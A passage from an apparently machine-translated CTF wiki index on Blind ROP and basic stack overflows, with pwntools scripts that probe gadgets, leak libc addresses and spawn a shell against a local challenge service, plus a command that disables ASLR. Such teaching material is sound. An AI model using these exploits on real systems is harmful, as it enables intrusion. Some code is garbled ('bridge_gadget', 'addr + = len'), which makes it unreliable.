noted that the attack condition 2 indicates that the program itself does not change because of the crash, so the canary equivalent is the same each time. So we can blast by byte. As the paper shows, there are up to 256 possibilities per byte, so in the case of 32 bits, we need to blast up to 1024 times, and 64 bits can blast up to 2048 times.\n\n\n![](./figure/stack_reading.png)\n\n\n\n#### Blind ROP\n\n\n##### The basic idea\n\n\nThe simplest way to execute the write function is to construct a system call.\n\n\n`` `asm\npop rdi; right # socket\npop rsi; ret # buffer\npop rdx; ret # length\n\npop rax; ret # write syscall number\n\nsyscall\n</code></pre> <p>But in general, such an approach is more difficult, because it is basically impossible to find a syscall address. . . We can get it by converting to find the way to write.</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#brop-gadgets","title":"BROP gadgets","text":"<p>First, at the end of libc_csu_init, a long list of gadgets, we can get the first two parameters of the write function call by offset. As shown in the text</p> <p></p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#find-a-call-write","title":"find a call write","text":"<p>We can get the address of the write through the plt table.</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#control-rdx","title":"control rdx","text":"<p>It should be noted that rdx is just a variable we use to output the length of the program byte, as long as it is not 0. Generally speaking, the rdx in the program will not be zero. But in order to better control the program output, we still try to control this value. But in the program</p> <p><code>`</code>asm pop rdx; ret</p> <pre><code>There are almost no such instructions. So how do we control the value of rdx? Here we need to explain that when strcmp is executed, rdx will be set to the length of the string to be compared, so we can find the strcmp function to control rdx.\n\n\nThen the next question, we can be divided into two\n\n\nFind gadgets\nFind a PLT form\n- write entry\n- strcmp entry\n\n\n##### Looking for gadgets\n\n\nFirst, let&amp;#39;s find a way to find gadgets. At this point, since we don&amp;#39;t know what the program looks like, we can only guess the corresponding gadgets by simply setting the return address of the program to its own value. When we control the return address of the program, there are generally the following situations:\n\n\n- The program crashes directly\n- The program crashes after running for a while\n- The program keeps running without crashing\n\n\nIn order to find reasonable gadgets, we can divide into the following two steps.\n\n###### Looking for stop gadgets\n\n\nThe so-called &amp;quot;stop gadget&amp;quot; generally refers to such a piece of code: when the program executes this code, the program will enter an infinite loop, so that the attacker can remain connected.\n\n\n&amp;gt; In fact, the stop gadget does not have to be the same as above. Its basic purpose is to tell the attacker that the return address tested is a gadgets.\n\n\nThe reason for finding stop gadgets is that when we guess a gadgtes, if we just lay it on the stack, the program will jump to the next address on the stack after executing the gadget. If the address is an illegal address, the program will crash. In this case, the attacker seems to be a simple crash. Therefore, the attacker would think that he did not execute any `useful gadget` in the process and gave up. The example is as follows\n\n\n![](./figure/stop_gadget.png)\n\n\n\nHowever, if we have a `stop gadget`, then for every address we want to try, if it is a gadget, then the program won&amp;#39;t crash. Next, just think of ways to identify these gadgets.\n\n\n###### Identifying gadgets\n\n\nSo how do we identify these gadgets? We can identify by stack layout and the behavior of the program. For easier introduction, here are the three addresses on the stack.\n\n\n-   **Probe**\n\n- Probe, which is the code address we want to probe. In general, all 64-bit programs can be tried directly from 0x400000. If it is not successful, it is possible that the program has PIE protection enabled. If it is not good, it may be that the program is 32-bit. . I haven&amp;#39;t really wanted to understand here, how can I quickly determine the number of remote bits.\n-   **Stop**\n\n- The address of the stop gadget that will not crash the program.\n-   **Trap**\n\n- an address that can cause the program to crash\n\n\nWe can identify the instruction being executed by placing **Stop** and **Trap** in different orders on the stack. Because executing Stop means the program won&amp;#39;t crash, executing Trap means the program will crash immediately. Here are a few examples\n\n\n-   probe,stop,traps(traps,traps,...)\n\n- We can find a gadget that does not pop the stack, such as if the program crashes or not (** if the program crashes directly at the probe)\n- right\n        -   xor eax,eax; ret\n\n-   probe,trap,stop,traps\n\n- We can find a gadget that just pops up a stack variable through such a layout. Such as\n- pop rax; right\n- pop rdi; right\n-   probe, trap, trap, trap, trap, trap, trap, stop, traps\n\n- We can use this layout to find a gadget that pops up 6 stack variables, which is a gadget similar to a brop gadget. **There is a problem with the original text. For example, if you encounter an address that just pops a stack variable, it will not crash. **In general, you will encounter two interesting places.\n- plt will not collapse,\n- _start will not collapse, which is equivalent to re-execution of the program.\n\n\nThe reason for putting a trap behind each layout is to be able to recognize that when the instruction executed at the corresponding address of our probe skips the stop, the program crashes immediately.\n\n\nHowever, even then, it is still difficult to identify which register the given gadget is operating on.\n\n\nHowever, it is important to note that the 6 registers of gadgets are popped up to the BROP, which is not often seen in the program. So, if we find such gadgets, then there is a great possibility that this gadgets are brop gadgets. In addition, this gadgets can also generate gadgets such as pop rsp by misplacement, which can make the program crash as a sign to identify this gadgets.\n\n\nIn addition, according to our previous ret2libc_csu_init, we can know that the address minus 0x1a will get its previous gadgets. Can be used to call other functions.\n\n\nNeed to pay attention to is that the probe may be a stop gadget, we have to check it, how to check it? We just need to make all the content behind it a trap address. Because if it is a stop gadget, the program will execute normally, otherwise it will crash. It seems very interesting.\n\n\n##### Looking for PLT\n\n\nAs shown in the following figure, the plt table of the program has a relatively regular structure, and each plt entry is 16 bytes. Moreover, at the 6-byte offset of each entry, it is the parsing path of the function corresponding to the entry, that is, when the program first executes the function, the path is executed to parse the function&amp;#39;s got address.\n\n\n![](./figure/brop_plt.png)\n\n\n\nIn addition, for most plt calls, it is generally not easy to crash, even with strange parameters. So, if we find a series of code segments of length 16 that don&amp;#39;t crash the program, then we have some reason to believe that we have encountered a plt table. In addition, we can also determine whether we are in the middle of the plt entry or at the beginning by offsetting 6 bytes before and after.\n\n\n##### Control rdx\n\n\nWhen we find the plt table, below, we should find a way to control the value of rdx, then how to confirm the location of strcmp? Need to say in advance that not all programs will call the strcmp function, so without calling the strcmp function, we have to use other methods to control the value of rdx. Here is the case where the strcmp function is used in the program.\n\n\nPreviously, we have found the gadgets for brop, so we can control the first two parameters of the function. At the same time, we define the following two addresses\n\n\n- readable, readable address.\n- bad, illegal address, not accessible, say 0x0.\n\n\nThen if we control the parameters passed as a combination of these two addresses, the following four situations will occur.\n\n\n- strcmp(bad,bad)\n\n- strcmp(bad,readable)\n\n- strcmp(readable,bad)\n\n- strcmp(readable,readable)\n\n\n\nOnly the last format will the program execute normally.\n\n\n**Note**: In the absence of PIE protection, the 64-bit program&amp;#39;s ELF file has 7 non-zero bytes at 0x400000.\n\n\nSo how do we do it specifically? One straightforward method is to scan each plt entry from start to finish, but this is more troublesome. We can choose one of the following methods\n\n\n- Slow path using plt entries\n- and use the address of the slow path of the next entry to override the return address\n\n\nIn this way, we do not have to control the corresponding variables back and forth.\n\n\nOf course, we may also happen to find the strncmp or strcasecmp functions, which have the same effect as strcmp.\n\n\n##### Looking for output functions\n\n\nLook for the output function to find both write and puts. Generally look for the puts function now. However, for the convenience of introduction, first introduce how to find write.\n\n\n###### Looking for write@plt\n\n\nWhen we can control the three parameters of the write function, we can traverse all the plt tables again, and find the corresponding function according to the output of the write function. It should be noted that one of the more troublesome things here is that we need to find the value of the file descriptor. In general, we have two ways to find this value.\n\n\n- Use rop chain, and make the file descriptors corresponding to each rop different\n- Open multiple connections at the same time, and we use a relatively high number to try.\n\n\nhave to be aware of is\n\n\n- By default, a process can only open up to 1024 file descriptors.\n- The posix standard file descriptor value per application is always the current minimum available value.\n\n\nOf course, we can also choose to look for the puts function.\n\n\n###### Looking for puts@plt\n\n\nLooking for the puts function (here we are looking for plt), we naturally need to control the rdi parameters. Above, we have found the brop gadget. Then, we can get the corresponding gadgets according to the brop gadget offset 9 (followed by ret2libc_csu_init). At the same time, in the case that the program has not yet turned on PIE protection, 0x400000 is the head of the ELF file, and its content is \\x7fELF. So we can judge based on this. In general, its payload is as follows\n</code></pre> <p>payload = 'A'*length +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)</p> <pre><code>#### Attack Summary\n\n\nAt this point, the attacker can already control the output function, so the attacker can output more content of the .text section in order to find more suitable gadgets. At the same time, the attacker can also find some other functions, such as dup2 or execve functions. Generally, the attacker will do the next thing at this time.\n\n\n- Redirect socket output to input and output\n- Look for the address of &amp;quot;/bin/sh&amp;quot;. In general, it is best to find a writable memory and use the write function to write the string to the appropriate address.\n- Execve the execve to get the shell, and the execve is not necessarily in the plt table. At this point, the attacker needs to find a way to execute the system call.\n\n\n### Examples\n\n\nHere we take [HCTF2016&amp;#39;s issuer missing] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/brop/hctf2016-brop) as an example. The basic idea is as follows\n\n\n#### Determine stack overflow length\n\n\n```python\n\ndef getbufferflow_length():\n    i = 1\n\n    while 1:\n\n        try:\n\n            sh = remote('127.0.0.1', 9999)\n\n            sh.recvuntil('WelCome my friend,Do you know password?\\n')\n\n            sh.send(i * 'a')\n\n            output = sh.recv()\n\n            sh.close()\n\n            if not output.startswith('No password'):\n\n                return i - 1\n\n            else:\n\n                i += 1\n\n        except EOFError:\n\n            sh.close()\n\n            return i - 1\n</code></pre> <p>Based on the above, we can determine that the length of the stack overflow is 72. At the same time, according to the echo information, it can be found that the program does not open canary protection, otherwise, there will be corresponding error content. So we don't need to perform stack reading.</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#looking-for-stop-gadgets","title":"Looking for stop gadgets","text":"<p>The search process is as follows</p> <pre><code>def get_stop_addr(length):\n\n    addr = 0x400000\n\n    while 1:\n\n        try:\n\n            sh = remote('127.0.0.1', 9999)\n\n            sh.recvuntil('password?\\n')\n\n            payload = 'a' * length + p64(addr)\n\n            sh.sendline(payload)\n\n            sh.recv()\n\n            sh.close()\n\n            print 'one success addr: 0x%x' % (addr)\n\n            return addr\n\n        except Exception:\n\n            addr += 1\n\n            sh.close()\n</code></pre> <p>Here we directly try 64-bit programs without PIE, because it is generally like this, if it is turned on, then follow the open method, and found a lot, I chose a seemingly return Address to the source program</p> <pre><code>one success stop gadget addr: 0x4006b6\n</code></pre>"},{"location":"pwn/linux/stackoverflow/medium-rop/#identifying-brop-gadgets","title":"Identifying brop gadgets","text":"<p>Below, we get the corresponding brop gadgets address according to the principle described above. Constructed as follows, get_brop_gadget is to get a possible brop gadget, the latter check_brop_gadget is for checking.</p> <pre><code>def get_brop_gadget(length, stop_gadget, addr):\n\n    try:\n\n        sh = remote('127.0.0.1', 9999)\n\n        sh.recvuntil('password?\\n')\n\n        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(\n\n            stop_gadget) + p64(0) * 10\n\n        sh.sendline(payload)\n\n        content = sh.recv()\n\n        sh.close()\n\n        print content\n\n        # stop gadget returns memory\n\n        if not content.startswith('WelCome'):\n\n            return False\n\n        return True\n\n    except Exception:\n\n        sh.close()\n\n        return False\n\n\n\n\n\ndef check_brop_gadget(length, addr):\n\n    try:\n\n        sh = remote('127.0.0.1', 9999)\n\n        sh.recvuntil('password?\\n')\n\n        payload = 'a' * length + p64(addr) + 'a' * 8 * 10\n\n        sh.sendline(payload)\n\n        content = sh.recv()\n\n        sh.close()\n\n        return False\n\n    except Exception:\n\n        sh.close()\n\n        return True\n\n\n\n\n\n##length = getbufferflow_length()\n\nlength = 72\n\n##get_stop_addr(length)\n\nstop_gadget = 0x4006b6\n\naddr = 0x400740\n\nwhile 1:\n\n    print hex(addr)\n\n    if get_brop_gadget(length, stop_gadget, addr):\n\n        print 'possible brop gadget: 0x%x' % addr\n\n        if check_brop_gadget(length, addr):\n\n            print 'success brop gadget: 0x%x' % addr\n\n            break\n\n    addr += 1\n</code></pre> <p>In this way, we basically got the bopp gadgets address 0x4007ba</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#determine-the-putsplt-address","title":"Determine the puts@plt address","text":"<p>According to the above, we can construct the following payload to get the acquisition.</p> <pre><code>payload = 'A'*72 +p64(pop_rdi_ret)+p64(0x400000)+p64(addr)+p64(stop_gadget)\n</code></pre> <p>The specific function is as follows</p> <pre><code>def get_puts_addr(length, rdi_ret, stop_gadget):\n\n    addr = 0x400000\n\n    while 1:\n\n        print hex(addr)\n\n        sh = remote('127.0.0.1', 9999)\n\n        sh.recvuntil('password?\\n')\n\n        payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(\n\n            addr) + p64(stop_gadget)\n\n        sh.sendline(payload)\n\n        try:\n\n            content = sh.recv()\n\n            if content.startswith('\\x7fELF'):\n\n                print 'find puts@plt addr: 0x%x' % addr\n\n                return addr\n            sh.close()\n\n            addr += 1\n\n        except Exception:\n\n            sh.close()\n\n            addr += 1\n</code></pre> <p>Finally, according to the structure of plt, choose 0x400560 as puts@plt</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#leaking-putsgot-address","title":"Leaking puts@got address","text":"<p>After we can call the puts function, we can leak the address of the puts function, and then get the libc version, so as to get the relevant system function address and /bin/sh address to get the shell. We leaked 0x1000 bytes from 0x400000, which is enough to contain the plt part of the program. code show as below</p> <pre><code>def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):\n\n    sh = remote('127.0.0.1', 9999)\n\n    payload = 'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(\n\n        puts_plt) + p64(stop_gadget)\n\n    sh.recvuntil('password?\\n')\n\n    sh.sendline(payload)\n\n    try:\n\n        data = sh.recv()\n\n        sh.close()\n\n        try:\n\n            data = data[:data.index(\"\\nWelCome\")]\n\n        except Exception:\n\ndate = data\n        if data == \"\":\n\n            data = '\\x00'\n\n        return data\n\n    except Exception:\n\n        sh.close()\n\n        return None\n\n\n\n\n\n##length = getbufferflow_length()\n\nlength = 72\n\n##stop_gadget = get_stop_addr(length)\n\nstop_gadget = 0x4006b6\n\n## brop_gadget = find_brop_gadget (length, stop_gadget)\nbrop_gadget = 0x4007ba\nrdi_ret = bridge_gadget + 9\n##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)\n\nputs_plt = 0x400560\naddr = 0x400000\n\nresult = \"\"\n\nwhile addr &lt; 0x401000:\n\n    print hex(addr)\n\n    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)\n\n    if data is None:\n\n        continue\n\n    else:\n\n        result += data\n\naddr + = len (data)\nwith open('code', 'wb') as f:\n\n    f.write(result)\n</code></pre> <p>Finally, we write the leaked content to a file. It should be noted that if the leak is \"\", then we have encountered '\\x00', because puts is the output string, the string is terminated with '\\x00'. Then use ida to open the binary mode, first change the base address of the program to 0x400000 in edit-&gt;segments-&gt;rebase program, and then find the offset 0x560, as follows</p> <p><code>`</code>asm seg000: 0000000000400560 db 0FFh seg000: 0000000000400561 pcs 25h; % seg000: 0000000000400562 db 0B2h; seg000: 0000000000400563 db 0Ah seg000:0000000000400564                 db  20h</p> <p>seg000: 0000000000400565 db 0 <pre><code>Then press c to convert the data here into assembly instructions as follows\n\n\n`` `asm\nseg000: 0000000000400560; -------------------------------------------------- -------------------------\nseg000: 0000000000400560 jmp qword for cs: 601018h\nseg000: 0000000000400566; -------------------------------------------------- -------------------------\nseg000:0000000000400566                 push    0\n\nseg000:000000000040056B                 jmp     loc_400550\n\nseg000:000000000040056B ; ---------------------------------------------------------------------------\n</code></pre></p> <p>This shows that the address of puts@got is 0x601018.</p>"},{"location":"pwn/linux/stackoverflow/medium-rop/#program-utilization","title":"Program Utilization","text":"<pre><code>##length = getbufferflow_length()\n\nlength = 72\n\n##stop_gadget = get_stop_addr(length)\n\nstop_gadget = 0x4006b6\n\n## brop_gadget = find_brop_gadget (length, stop_gadget)\nbrop_gadget = 0x4007ba\nrdi_ret = bridge_gadget + 9\n##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)\n\nputs_plt = 0x400560\n##leakfunction(length, rdi_ret, puts_plt, stop_gadget)\n\nputs_got = 0x601018\n\n\n\nsh = remote('127.0.0.1', 9999)\n\nsh.recvuntil('password?\\n')\n\npayload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(\n\n    stop_gadget)\n\nsh.sendline(payload)\n\ndata = sh.recvuntil('\\nWelCome', drop=True)\n\nputs_addr = u64 (data.ljust (8, &amp;#39;x00&amp;#39;))\nlibc = LibcSearcher('puts', puts_addr)\n\nlibc_base = puts_addr - libc.dump('puts')\n\nsystem_addr = libc_base + libc.dump('system')\n\nbinsh_addr = libc_base + libc.dump('str_bin_sh')\n\npayload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(\n\n    system_addr) + p64(stop_gadget)\n\nsh.sendline(payload)\n\nsh.interactive()\n</code></pre>"},{"location":"pwn/linux/stackoverflow/medium-rop/#reference-reading","title":"Reference reading","text":"<ul> <li> <p>http://ytliu.info/blog/2014/09/28/blind-return-oriented-programming-brop-attack-gong-ji-yuan-li/</p> </li> <li> <p>http://bobao.360.cn/learning/detail/3694.html</p> </li> <li> <p>http://o0xmuhe.me/2017/01/22/Have-fun-with-Blind-ROP/</p> </li> </ul>"},{"location":"pwn/linux/stackoverflow/stack-intro/","title":"\u6808\u4ecb\u7ecd","text":""},{"location":"pwn/linux/stackoverflow/stack-intro/#basic-stack-introduction","title":"Basic stack introduction","text":"<p>The stack is a typical data structure of Last in First Out. Its operations mainly include push and pop operations, as shown in the following figure (Wikipedia). Both operations operate on the top of the stack, and of course, it also has a stack.</p> <p>![Basic stack operation] (./figure/Data_stack.png)</p> <p>High-level languages are converted to assembler at runtime, making full use of this data structure while the assembler is running. Each program has a virtual address space at runtime, and a part of it is the stack corresponding to the program, which is used to save function call information and local variables. In addition, common operations are also stacking and popping. It should be noted that the stack of the ** program is growing from the high address of the process address space to the low address.</p>"},{"location":"pwn/linux/stackoverflow/stack-intro/#function-call-stack","title":"function call stack","text":"<p>Be sure to take a closer look at the following article to learn the basic function call stack.</p> <ul> <li>[C language function call stack (1)] (http://www.cnblogs.com/clover-toeic/p/3755401.html)</li> <li>[C language function call stack (2)] (http://www.cnblogs.com/clover-toeic/p/3756668.html)</li> </ul> <p>Here is another diagram of the register.</p> <p></p> <p>It should be noted that 32-bit and 64-bit programs have the following simple differences.</p> <ul> <li> <p>x86</p> </li> <li> <p>Function parameter ** above the ** function return address</p> </li> <li> <p>x64</p> </li> <li> <p>System V AMD64 ABI (used in Linux, FreeBSD, macOS, etc.) The first six integer or pointer parameters are stored in the RDI, RSI, RDX, RCX, R8 and R9 registers, if there are more The parameters will be saved on the stack.</p> </li> <li>The memory address cannot be greater than 0x00007FFFFFFFFFFF, 6 bytes long, otherwise an exception will be thrown.</li> </ul>"},{"location":"pwn/linux/stackoverflow/stack-intro/#reference-reading","title":"Reference reading","text":"<ul> <li>a tap</li> <li>Calling conventions for different C++ compilers and operating systems, Agner Fog</li> </ul>"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/","title":"Stack overflow principle","text":""},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#introduction","title":"Introduction","text":"<p>Stack overflow refers to the number of bytes written by the program to a variable in the stack that exceeds the number of bytes requested by the variable itself, thus causing the value of the variable in the stack adjacent to it to be changed. This problem is a specific buffer overflow vulnerability, similar to heap overflow, bss segment overflow and other overflow methods. A stack overflow vulnerability can cause a program to crash, and in addition, an attacker can control the execution flow of the program. In addition, we are not difficult to find that the basic premise of stack overflow is</p> <ul> <li>The program must write data to the stack.</li> <li>The size of the data written is not well controlled.</li> </ul>"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#basic-example","title":"Basic example","text":"<p>The most typical stack overflow exploit is to cover the return address of the program to the address controlled by the attacker. ** Of course, you need to ensure that the segment where the address is located has executable permissions**. Below, we give a simple example:</p> <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;string.h&gt;\n\nvoid success() { puts(\"You Hava already controlled it.\"); }\n\nvoid vulnerable() {\n\n  char s[12];\n\n  gets(s);\n\n  puts(s);\n\n  return;\n\n}\n\nint main(int argc, char **argv) {\n\n  vulnerable();\n\n  return 0;\n\n}\n</code></pre> <p>The main purpose of this program is to read a string and output it. **We want to control the program to execute the success function. **</p> <p>We compile it with the following command</p> <pre><code>\u279c  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example \n\nstack_example.c: In function \u2018vulnerable\u2019:\n\nstack_example.c:6:3: warning: implicit declaration of function \u2018gets\u2019 [-Wimplicit-function-declaration]\n\n   gets(s);\n\n   ^\n\n/tmp/ccPU8rRA.o: In the function &amp;#39;vulnerable&amp;#39;:\nstack_example.c:(.text+0x27): \u8b66\u544a\uff1a the `gets' function is dangerous and should not be used.\n</code></pre> <p>It can be seen that gets itself is a dangerous function. It never checks the length of the input string, but uses Enter to determine if the input is over, so it can easily cause the stack to overflow.</p> <p>&gt; Historically, the Morris worm first worm exploited the dangerous function get to implement stack overflow.</p> <p>In the gcc compiler directive, <code>-m32</code> refers to the generation of a 32-bit program; <code>-fno-stack-protector</code> refers to the stack overflow protection not being turned on, that is, no canary is generated. In addition, in order to introduce the basic use of stack overflow more conveniently, it is also necessary to disable PIE (Position Independent Executable) to avoid the disruption of the load base address. Different gcc versions have different default configurations for PIE. We can use the command <code>gcc -v</code> to view the default gcc switch status. If the <code>--enable-default-pie</code> parameter is present, it means that the PIE is enabled by default. You need to add the parameter <code>-no-pie</code> to the compile directive.</p> <p>After compiling successfully, you can check the compiled file with the checksec tool:</p> <pre><code>\u279c  stack-example checksec stack_example\n\n    Arch:     i386-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x8048000)\n</code></pre> <p>Referring to the PIE protection at compile time, there is also a mechanism for Address Space Distribution Randomization (ASLR) under the Linux platform. Simply put, even if the executable file has PIE protection enabled, you need to enable ASLR to actually disturb the base address. Otherwise, the program will still load a fixed base address (but not the base address of No PIE). We can control the ASLR startup by modifying <code>/proc/sys/kernel/randomize_va_space</code>. The specific options are</p> <ul> <li>0, close ASLR, no randomization. The base addresses of the stack, heap, and .so are the same every time.</li> <li>1, ordinary ASLR. The stack base address, the mmap base address, and the .so load base address are all randomized, but the heap base address is not randomized.</li> <li>2, Enhanced ASLR, based on 1, adds randomization of the heap base address.</li> </ul> <p>We can use the <code>echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space</code> to turn off the ASLR of the Linux system. Similarly, you can configure the corresponding parameters.</p> <p>In order to reduce the complexity of subsequent exploits, we close ASLR here and close PIE at compile time. Of course, readers can also try different combinations of ASLR and PIE switches, and use IDA and its dynamic debugging function to observe the program address change (can also be successfully attacked when ASLR is closed and PIE is enabled).</p> <p>After confirming that the stack overflow and PIE protection are turned off, we use IDA to decompile the binary and view the vulnerable function. can be seen</p> <pre><code>int vulnerable()\n\n{\n\n  char s; // [sp+4h] [bp-14h]@1\n\n\n\n  gets(&amp;s);\n\n  return puts(&amp;s);\n\n}\n</code></pre> <p>The length of the string distance ebp is 0x14, then the corresponding stack structure is</p> <pre><code>                                           +-----------------+\n\n| retaddr |\n                                           +-----------------+\n\n                                           |     saved ebp   |\n\n                                    ebp---&gt;+-----------------+\n\n                                           |                 |\n\n                                           |                 |\n\n                                           |                 |\n\n                                           |                 |\n\n                                           |                 |\n\n                                           |                 |\n\n                              s,ebp-0x14--&gt;+-----------------+\n</code></pre> <p>And, we can get the address of success through IDA, its address is 0x0804843B.</p> <p><code>`</code>asm .text:0804843B success         proc near</p> <p>.text:0804843B                 push    ebp</p> <p>.text:0804843C                 mov     ebp, esp</p> <p>.text:0804843E                 sub     esp, 8</p> <p>.text:08048441                 sub     esp, 0Ch</p> <p>.text:08048444                 push    offset s        ; \"You Hava already controlled it.\"</p> <p>.text:08048449                 call    _puts</p> <p>.text:0804844E                 add     esp, 10h</p> <p>.text: 08048451 .text:08048452                 leave</p> <p>.text: 08048453 retn .text:08048453 success         endp</p> <pre><code>Then if we read the string is\n</code></pre> <p>0x14*'a'+'bbbb'+success_addr</p> <pre><code>Then, since gets will read the carriage return, we can directly read all the strings, and cover the saved ebp to bbbb and the retaddr to success_addr. That is, the stack structure at this time is\n\n\n```text\n\n                                           +-----------------+\n\n                                           |    0x0804843B   |\n                                           +-----------------+\n\n| . \\ t\n                                    ebp---&gt;+-----------------+\n\n                                           |                 |\n\n                                           |                 |\n\n                                           |                 |\n\n                                           |                 |\n\n                                           |                 |\n\n                                           |                 |\n\n                              s,ebp-0x14--&gt;+-----------------+\n</code></pre> <p>However, it should be noted that since in the computer's memory, each value is stored in bytes. In general, small-end storage is used, that is, the form of 0x0804843B in memory is</p> <pre><code>\\x3b\\x84\\x04\\x08\n</code></pre> <p>However, we can't input these characters directly in the terminal. When the terminal inputs, \\, x, etc. also count as a single character. . So we need to find a way to enter \\x3b as a character. So at this point we need to use a wave of pwntools (about how to install and basic usage, please github), here the code using pwntools is as follows:</p> <pre><code>##coding=utf8\n\nfrom pwn import *\n\n## Constructing objects that interact with the program\nsh = process('./stack_example')\n\nsuccess_addr = 0x0804843b\n\n## Constructing a payload\npayload = 'a' * 0x14 + 'bbbb' + p32(success_addr)\n\nprint p32(success_addr)\n\n## Send a string to the program\nsh.sendline(payload)\n\n## Convert code interaction to manual interaction\nsh.interactive()\n</code></pre> <p>Execute a wave of code to get</p> <pre><code>\u279c  stack-example python exp.py\n\n[+] Starting local process './stack_example': pid 61936\n\nx84\n[*] Switching to interactive mode\n\naaaaaaaaaaaaaaaaaaaabbbb; \\ x84 \\ x0\nYou Hava already controlled it.\n\n[*] Got EOF while reading in interactive\n\n$ \n\n[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)\n\n[*] Got EOF while sending in interactive\n</code></pre> <p>You can see that we have indeed executed the success function.</p>"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#_1","title":"\u5c0f\u8ff0","text":"<p>The above example actually shows the more important steps in the stack overflow.</p>"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#looking-for-dangerous-functions","title":"Looking for dangerous functions","text":"<p>By looking for dangerous functions, we quickly determine if the program is likely to have a stack overflow and, if so, where the stack overflows. Common dangerous functions are as follows</p> <ul> <li>Enter</li> <li> <p>gets, read a line directly, ignoring '\\x00'</p> <ul> <li> <p>scanf</p> </li> <li> <p>vscanf</p> </li> </ul> </li> <li> <p>output</p> <ul> <li>sprintf</li> </ul> </li> <li> <p>string</p> </li> <li>strcpy, string copy, encountered '\\x00' stop</li> <li>strcat, string splicing, encountered '\\x00' stop</li> <li>bcopy</li> </ul>"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#determine-the-fill-length","title":"Determine the fill length","text":"<p>This part is mainly to calculate the distance between the address we want to operate and the address we want to cover**. A common method of operation is to turn on IDA and calculate the offset based on its given address. General variables will have the following index modes</p> <ul> <li>The index relative to the stack base address can be obtained directly by looking at the EBP relative offset</li> <li>The index corresponding to the top pointer of the stack generally needs to be debugged, and then it will be converted to the first type.</li> <li>Direct address indexing is equivalent to directly giving an address.</li> </ul> <p>In general, we will have the following coverage requirements</p> <ul> <li>Override function return address, this time just look at EBP directly.</li> <li>** Overwrites the contents of a variable on the stack**, which requires more detailed calculations.</li> <li>Overwrites the contents of a variable in the bss section.</li> <li>Overwrite the contents of a specific variable or address based on actual implementation.</li> </ul> <p>The reason we want to cover an address is because we want to control the program execution flow directly or indirectly by overriding the address**.</p>"},{"location":"pwn/linux/stackoverflow/stackoverflow-basic/#reference-reading","title":"Reference reading","text":"<p>stack buffer overflow</p> <p>http://bobao.360.cn/learning/detail/3694.html</p> <p>https://www.cnblogs.com/rec0rd/p/7646857.html</p>"},{"location":"pwn/linux/summary/get-address/","title":"Get address","text":"<p>In the process of exploiting, we often need to get some variables, the address of the function, so that it can be further utilized. Here I will divide the methods for obtaining addresses into the following categories.</p> <ul> <li>Find the address directly, that is, we can directly see the address of the corresponding symbol by means of decompilation.</li> <li>Leak address, which requires us to leak the contents of some symbol pointers in the program by controlling the execution flow of the program to obtain the corresponding address.</li> <li>Speculative address, which we generally use here is based on the offset between the symbols in a segment is fixed, in order to infer the address of some new symbols.</li> <li>Guess the address, generally speaking, we need to guess the address of the corresponding symbol, which is often accompanied by violent enumeration.</li> </ul> <p>The above methods are a kind of progressive consideration. We should maintain this way of thinking when obtaining the address of the relevant symbol.</p> <p>In the above several ways, I think there are two main core ideas.</p> <ul> <li>Take full advantage of the nature of the code itself, such as the location of some code in the program is fixed, such as the location of the code segment when PIE is not turned on; for example, the last three bits of glibc are fixed.</li> <li>Take advantage of the nature of relative offsets. This is due to the fact that the memory that is currently loaded during program loading is a segment, so the relative offset is often fixed.</li> </ul> <p>More specific, we can look at the following introduction.</p>"},{"location":"pwn/linux/summary/get-address/#directly-looking-for-an-address","title":"Directly looking for an address","text":"<p>The address of the relevant variable or function has been given in the program. At this time, we can use it directly.</p> <p>This situation often applies when the program does not open PIE.</p>"},{"location":"pwn/linux/summary/get-address/#leak-address","title":"Leak address","text":"<p>In the process of leaking addresses, we often need to find sensitive pointers that store either the address of the symbol we want or the address of the symbol we want.</p> <p>Here are a few examples.</p>"},{"location":"pwn/linux/summary/get-address/#leaking-variable-pointer","title":"Leaking variable pointer","text":"<p>such as</p> <ol> <li>Leaking the header table pointers of various bins in the main arena, you may be able to get the address of a variable in the heap or glibc.</li> </ol>"},{"location":"pwn/linux/summary/get-address/#leaking-got-table","title":"leaking got table","text":"<p>Sometimes we don't have to know the address of a function directly. We can use the GOT table to jump to the address of the corresponding function. Of course, if we have to know the address of this function, we can use the output function such as write, puts and so on to output the corresponding content in the address of the GOT table (** premise that this function has been parsed once).</p>"},{"location":"pwn/linux/summary/get-address/#ret2dl-resolve","title":"ret2dl-resolve","text":"<p>When the ELF file is dynamically linked, the got table uses the delay binding technique. When the libc function is called for the first time, the program calls the _dl_runtime_resolve function to resolve its address. Therefore, we can use the stack overflow to construct the ROP chain and forge the parsing of other functions (such as: system). This is also the technique we introduced in the advanced rop.</p>"},{"location":"pwn/linux/summary/get-address/#procselfmaps","title":"/proc/self/maps","text":"<p>We can consider getting the base address associated with the program by reading the program's <code>/proc/self/maps</code>.</p>"},{"location":"pwn/linux/summary/get-address/#speculative-address","title":"Speculative address","text":"<p>In most cases, we can't directly get the address of the desired function, and often need to make some address speculation. As mentioned above, the 